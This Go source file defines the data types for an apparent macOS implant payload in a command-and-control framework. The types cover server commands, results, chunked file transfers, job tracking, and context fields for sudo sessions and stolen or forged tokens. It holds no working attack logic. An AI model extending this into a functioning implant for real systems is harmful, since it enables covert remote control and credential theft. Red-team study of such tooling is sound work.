// server/docker/payloads/Darwin/types.go

//go:build darwin
// +build darwin

package main

import (
	"sync"
	"time"
)

// Command represents a single command from the C2 server
type Command struct {
	Command          string `json:"command"`
	CommandID        string `json:"command_id"`
	CommandDBID      int    `json:"command_db_id"`
	AgentID          string `json:"agent_id"`
	Filename         string `json:"filename"`
	OriginalFilename string `json:"original_filename"`
	RemotePath       string `json:"remote_path"`
	CurrentChunk     int    `json:"currentChunk"`
	TotalChunks      int    `json:"totalChunks"`
	Data             string `json:"data"`
	Timestamp        string `json:"timestamp"`
	JobID            string `json:"job_id"`
}

// CommandResult represents the result of command execution
type CommandResult struct {
	Command     Command
	Output      string
	Error       error
	ErrorString string
	ExitCode    int
	CompletedAt string
	JobID       string // Add this field for async BOF tracking
}

// CommandResponse represents the response to send back to server
type CommandResponse struct {
	Command      string `json:"command"`
	CommandID    string `json:"command_id"`
	CommandDBID  int    `json:"command_db_id"`
	AgentID      string `json:"agent_id"`
	Filename     string `json:"filename"`
	RemotePath   string `json:"remote_path"`
	CurrentChunk int    `json:"currentChunk"`
	TotalChunks  int    `json:"totalChunks"`
	Data         string `json:"data"`
	Output       string `json:"output"`
	Error        string `json:"error,omitempty"`
	ExitCode     int    `json:"exit_code"`
	Timestamp    string `json:"timestamp"`
	JobID        string `json:"job_id"` // Add this field
}

// CommandContext holds shared state and functionality for commands
type CommandContext struct {
	mu             sync.RWMutex
	WorkingDir     string
	CurrentCommand *Command          // Add this field for BOF support
	SudoSession    interface{}       // Add this field for storing sudo session
	SessionEnv     map[string]string // Add this field for persistent environment variables
	StolenToken    interface{}       // Keep for backward compatibility
	TokenStore     interface{}       // Unified token store for both steal-token and make-token
	MakeToken      interface{}       // Keep for backward compatibility
}

// CommandInterface defines the interface that all commands must implement
type CommandInterface interface {
	Execute(ctx *CommandContext, args []string) CommandResult
	Name() string
}

// JobInfo represents information about an active job
type JobInfo struct {
	ID        string // Unique job identifier
	StartTime time.Time
	Filename  string
	Active    bool
	Type      string // "download", "upload", etc
}

// UploadInfo tracks active upload operations
type UploadInfo struct {
	Chunks      map[int][]byte
	TotalChunks int
	RemotePath  string
	Filename    string
	LastUpdate  time.Time // Track last chunk received time
	StartTime   time.Time // Track when upload started
}

// DownloadInfo tracks active download operations
type DownloadInfo struct {
	FilePath    string
	TotalChunks int
	NextChunk   int
	LastUpdate  time.Time
	InProgress  bool
}
